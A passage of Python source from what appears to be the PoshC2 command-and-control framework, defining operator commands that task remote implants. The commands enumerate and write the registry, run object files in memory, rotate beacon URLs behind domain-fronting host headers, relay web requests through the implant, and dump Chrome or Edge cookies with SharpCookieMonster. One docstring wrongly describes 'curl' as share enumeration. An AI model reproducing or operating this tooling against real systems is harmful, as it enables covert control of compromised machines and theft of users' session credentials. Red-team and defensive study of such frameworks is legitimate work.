        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration, Tag.Registry])
def do_ls_reg_hkcu(user, command, implant_id, command_prefix=""):
    """
    List a HKEY_CURRENT_USER registry value.

    MITRE TTPs:
        {}

    Arguments:
        ls-reg-hkcu <path>

    Examples:
        ls-reg-hkcu SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration, Tag.Registry])
def do_ls_reg_hklm(user, command, implant_id, command_prefix=""):
    """
    List a HKEY_LOCAL_MACHINE registry value.

    MITRE TTPs:
        {}

    Arguments:
        ls-reg-hklm <path>

    Examples:
        ls-reg-hklm SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration, Tag.Registry])
def do_ls_reg(user, command, implant_id, command_prefix=""):
    """
    List a registry value.

    MITRE TTPs:
        {}

    Arguments:
        ls-reg <hive> <path>

    Examples:
        ls-reg HKEY_LOCAL_MACHINE SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Registry])
def do_reg_write_hkcu(user, command, implant_id, command_prefix=""):
    """
    Writes a registry value to HKCU.

    MITRE TTPs:
        {}

    Arguments:
        reg-write-hkcu <path> <name> <value>

    Examples:
        reg-write-hkcu SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall <name> <value>
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration, Tag.Registry])
def do_reg_read(user, command, implant_id, command_prefix=""):
    """
    Read a registry value key.

    MITRE TTPs:
        {}

    Arguments:
        reg-read <path> <keyname>

    Examples:
        reg-read HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall Adobe
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration, Tag.Registry])
def do_reg_read_uninstall(user, command, implant_id, command_prefix=""):
    """
    Lists the UninstallString for each key under
    HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall.

    MITRE TTPs:
        {}

    Arguments:
        reg-read-uninstall

    Examples:
        reg-read-uninstall
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Enumeration])
def do_get_os_version(user, command, implant_id, command_prefix=""):
    """
    Returns the OS Version using OSVERSIONINFOEXW.

    MITRE TTPs:
        {}

    Arguments:
        get-os-version

    Examples:
        get-os-version
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Web])
def do_curl(user, command, implant_id, command_prefix=""):
    """
    Enumerates shares on the target.

    Uses netapi32.dll NetShareEnum.

    Has a default hard-coded User-Agent from msedge, but would recommend specifying an up-to-date one in headers.

    MITRE TTPs:
        {}

    Arguments:
        curl <url> [host header] [proxy url> [proxy-user] [proxy-pass] [comma-separated-headers]

    Examples:
        curl https://www.google.co.uk
        curl https://www.google.co.uk domain.azureedge.net
        curl https://www.google.co.uk domain.azureedge.net http://10.10.10.10:8080
        curl https://www.google.co.uk domain.azureedge.net http://10.10.10.10:8080 bob proxyPass
        curl https://www.google.co.uk domain.azureedge.net http://10.10.10.10:8080 bob proxyPass header1:value1,User-Agent:curl
        curl https://www.google.co.uk domain.azureedge.net "" "" "" header1:value1,header2:value2
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Web])
def do_runof(user, command, implant_id, command_prefix=""):
    """
    Runs an Object File like a Cobalt Strike BOF in memory from the current process.

    Autocompletion for OFs is from resources/modules/OFs.

    MITRE TTPs:
        {}

    Arguments:
        runof <OF location> [OF args]

    Examples:
        runof whoami.x64.o
    """
    check_module_loaded("RunOF.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("runof ", "run-exe RunOF.Program RunOF ")
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )
    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Comms])
def do_update_http_comms(user, command, implant_id, command_prefix=""):
    """
    Updates the HTTP beacon comms in use by a HTTP implant.

    Presents a wizard for navigating the options.
    The change is ephemeral and not persisted if the implant is restarted etc.

    MITRE TTPs:
        {}

    Arguments:
        update-http-comms

    Examples:
        update-http-comms
    """
    implant = get_implant(implant_id)
    implant_type = ImplantType.get(implant.type)

    if command_prefix != "" or implant_type not in [ImplantType.SharpHttp, ImplantType.SharpHttpProxy]:
        print_bad("update-http-comms can only be called on an internet-connected HTTP implant")
        return

    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.comms-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        beacon_comms_hosts = session.prompt(
            "Comma separated list of URLs to rotate over (e.g. https://127.0.0.1): ").strip()
        beacon_comms_headers = session.prompt(
            "Comma separated list of host headers (e.g. asdf.azureedge.net): ").strip()
    except KeyboardInterrupt:
        return

    config_update = build_sharp_config(
        beacon_comms_hosts=beacon_comms_hosts,
        beacon_comms_headers=beacon_comms_headers,
        # TODO beacon_uris=beacon_uris,
        # beacon_images=beacon_images
    )

    command = f"update-config {config_update}"

    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Credential_Harvesting])
def do_sharpcookiemonster(user, command, implant_id, command_prefix=""):
    """
    Dumps cookies from Chrome or Edge.

    Will start a new browser headless (no UI) with the debug port enabled and use that port to dump all the cookies.

    This is https://github.com/m0rv4i/SharpCookieMonster.

    An optional first argument specifies the site that chrome will initially connect to when launched (default
    https://www.google.com).
    An optional second argument sets whether chrome or msedge will be checked (default to chrome).
    An optional third argument specifies the port to launch the chrome debugger on (by default 9142).
    Finally, an optional third argument specifies the path to the user data directory, which can be overridden in order
    to access different profiles etc (default %APPDATALOCAL%\\Google\\Chrome\\User Data).

    MITRE TTPs:
        {}

    Arguments:
        sharpcookiemonster [url] [edge|chrome] [debugging-port] [user-data-dir]

    Examples:
        sharpcookiemonster
        sharpcookiemonster https://bbc.co.uk
        sharpcookiemonster https://bbc.co.uk edge
        sharpcookiemonster https://bbc.co.uk edge 4444
        sharpcookiemonster https://bbc.co.uk chrome 4444 C:\\chromeprofiles
    """
    check_module_loaded("SharpCookieMonster.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("sharpcookiemonster", "run-exe SharpCookieMonster.Program SharpCookieMonster")

    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
